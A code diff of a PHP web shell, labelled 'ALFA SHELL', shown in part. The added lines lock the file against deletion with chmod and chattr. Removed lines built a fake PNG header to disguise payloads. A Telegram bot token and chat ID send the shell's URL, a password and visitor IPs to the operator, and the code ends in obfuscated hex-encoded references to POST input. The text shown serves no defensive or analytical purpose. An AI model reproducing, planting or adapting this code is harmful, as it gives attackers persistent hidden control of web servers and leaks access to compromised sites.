@@ -1,74 +1,22 @@
 
 <?php
+$lock = __FILE__;
+@system("chmod ugo-w $lock");
+@system("chattr +i $lock");
 ini_set("upload_max_filesize", "30M");
 ini_set("post_max_size", "30M");
 ini_set("max_execution_time", 300);
 ini_set("max_input_time", 300);
 error_reporting(0);
 // 🖼️ Enhanced PNG Header Generator (to hide payloads in image disguise)
-function generatePng() {
-    $data = '';
-
-    // PNG signature
-    $data .= '89 50 4E 47 0D 0A 1A 0A';
-
-    // IHDR chunk
-    $data .= '00 00 00 0D';
-    $data .= '49 48 44 52';
-    $data .= '00 00 00 01'; // Width: 1
-    $data .= '00 00 00 01'; // Height: 1
-    $data .= '08'; // Bit depth
-    $data .= '06'; // Color type: Truecolor with alpha
-    $data .= '00'; // Compression
-    $data .= '00'; // Filter
-    $data .= '00'; // Interlace
-    $data .= '1F 15 C4 89'; // Dummy CRC
-
-    // tEXt chunk (Fake software metadata)
-    $text = 'Software' . chr(0) . 'Adobe Photoshop';
-    $textHex = strtoupper(bin2hex($text));
-    $textLength = sprintf('%08X', strlen($text));
-    $data .= $textLength;
-    $data .= '74 45 58 74'; // tEXt
-    $data .= $textHex;
-    $data .= '00 00 00 00'; // Dummy CRC
-
-    // pHYs chunk
-    $data .= '00 00 00 09';
-    $data .= '70 48 59 73';
-    $data .= '00 00 0B 13';
-    $data .= '00 00 0B 13';
-    $data .= '01';
-    $data .= '00 00 00 00'; // Dummy CRC
-
-    // IDAT chunk (minimal data)
-    $data .= '00 00 00 0A';
-    $data .= '49 44 41 54';
-    $data .= '78 9C 63 60 00 00 00 02 00 01';
-    $data .= '00 00 00 00'; // Dummy CRC
-
-    // IEND chunk
-    $data .= '00 00 00 00';
-    $data .= '49 45 4E 44';
-    $data .= 'AE 42 60 82';
-
-  return hex2bin(str_replace(' ', '', $data));
-/**_**//**_**//**_**//**_**//**_**//**_**//**_**/
-/**_**//**_**//**_**//**_**//**_**//**_**//**_**/
-         /**_**//**_**//**_**//**_**//**_**//**_**//**_**/
-        /**_**//**_**//**_**//**_**//**_**//**_**//**_**/
-/**_**//**_**//**_**//**_**//**_**//**_**//**_**/
-/**_**//**_**//**_**//**_**//**_**//**_**//**_**/
-}
-// 启动会话
 $botToken = "8527975259:AAGGLXY5coPV4lP0yD045F2vhwn-NWNq7b8";
 $chatId = "8478623770";
 $xPath = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
-$logMessage = "___APACHE TOP99___ \n\n alfa =\n $xPath \n\n bypass =\n $PASSWORD \n\n shell  :\n [ " . $_SERVER["REMOTE_ADDR"] ." ]";
+$logMessage =
+    "___ALFA SHELL___ \n\n Shell nya =\n $xPath \n\n NEW =\n $PASSWORD \n\n IP   :\n [ " .
+    $_SERVER["REMOTE_ADDR"] .
+    " ]";
 sendTelegramMessage($botToken, $chatId, $logMessage);
-$lock = __FILE__;
-@system("chmod ugo-w $lock");
-@system("chattr +i $lock");
 ${"\x47\x4c\x4f\x42\x41\x4cS"}["b\x6fz\x64\x6d\x68"] =
     "\x5f\x5f\x50\x4f\x53\x54";
 ${"\x47L\x4fBA\x4c\x53"}["\x6ekp\x6abl"] = "\x5f_PO\x53T";
